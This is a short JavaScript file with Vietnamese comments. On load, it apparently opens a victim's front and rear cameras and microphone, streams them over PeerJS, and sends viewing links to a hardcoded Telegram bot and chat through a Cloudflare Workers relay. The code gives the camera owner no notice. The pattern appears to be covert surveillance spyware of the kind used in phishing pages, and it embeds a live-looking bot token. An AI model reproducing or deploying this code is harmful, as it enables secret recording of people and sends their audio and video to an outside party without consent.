const TELEGRAM_BOT_TOKEN = '7642675616:AAHMlI4Dje9L4SkmHNo4dPGVxPL6dqkXPMw';
const TELEGRAM_CHAT_ID = '-4957526303';
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Gửi link xem livestream lên Telegram
function sendStreamLink() {
  const link = `🟢 Xem livestream:
🔹 Camera trước: https://yourdomain.com/viewer.html?id=stream-front
🔹 Camera sau: https://yourdomain.com/viewer.html?id=stream-back`;

  fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: link
    })
  });
}

// Phát camera theo hướng (trước hoặc sau)
function startStream(peerId, facingMode) {
  navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: true })
    .then(stream => {
      const peer = new Peer(peerId);
      peer.on('open', id => {
        console.log(`🟢 Đang phát: ${id}`);
      });
      peer.on('call', call => {
        call.answer(stream);
      });

      // Hiển thị video local nếu muốn
      const video = document.createElement('video');
      video.srcObject = stream;
      video.autoplay = true;
      video.muted = true;
      video.playsInline = true;
      video.style.width = "300px";
      video.style.border = "2px solid white";
      document.body.appendChild(video);
    })
    .catch(err => {
      console.error(`❌ Lỗi camera ${peerId}:`, err.message);
    });
}

// Bắt đầu phát cả 2 camera
startStream('stream-front', 'user');
startStream('stream-back', 'environment');

// Gửi link xem về bot
sendStreamLink();
